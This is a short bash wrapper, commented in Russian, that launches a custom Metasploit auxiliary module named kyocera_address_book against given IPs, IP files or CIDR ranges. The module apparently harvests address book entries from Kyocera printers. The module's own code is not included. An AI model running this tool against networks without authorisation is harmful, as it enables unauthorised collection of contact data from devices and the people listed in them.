#!/usr/bin/env bash
# Запускает Metasploit-модуль прямо из репозитория — без копирования файлов.
# Использование: ./run_msf.sh <RHOSTS> [доп. опции MSF]
#   ./run_msf.sh 10.0.0.10
#   ./run_msf.sh 10.0.0.10,10.0.0.20
#   ./run_msf.sh 10.0.0.0/24 "set WAIT 10"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if [ $# -eq 0 ]; then
    echo "Использование: $0 <IP | FILE | CIDR> [\"set OPT VALUE\" ...]"
    echo ""
    echo "  $0 10.0.0.10"
    echo "  $0 10.0.0.0/24"
    echo "  $0 ips.txt"
    echo "  $0 10.0.0.10 \"set WAIT 10\""
    exit 1
fi

TARGET="$1"
shift

# MSF поддерживает file:/abs/path в качестве RHOSTS
if [ -f "$TARGET" ]; then
    RHOSTS="file:$(realpath "$TARGET")"
else
    RHOSTS="$TARGET"
fi

# Собираем дополнительные set-команды
EXTRA_CMDS=""
for arg in "$@"; do
    EXTRA_CMDS="$EXTRA_CMDS; $arg"
done

if ! command -v msfconsole &>/dev/null; then
    echo "[!] msfconsole не найден. Установи Metasploit: https://metasploit.com"
    exit 1
fi

# Проверяем симлинк
SYMLINK="$SCRIPT_DIR/auxiliary/gather/kyocera_address_book.rb"
if [ ! -e "$SYMLINK" ]; then
    echo "[*] Симлинк не найден, создаю..."
    mkdir -p "$SCRIPT_DIR/auxiliary/gather"
    ln -sf "$SCRIPT_DIR/kyocera_address_book.rb" "$SYMLINK"
fi

msfconsole -q \
    -m "$SCRIPT_DIR" \
    -x "use auxiliary/gather/kyocera_address_book; set RHOSTS $RHOSTS$EXTRA_CMDS; run; exit"
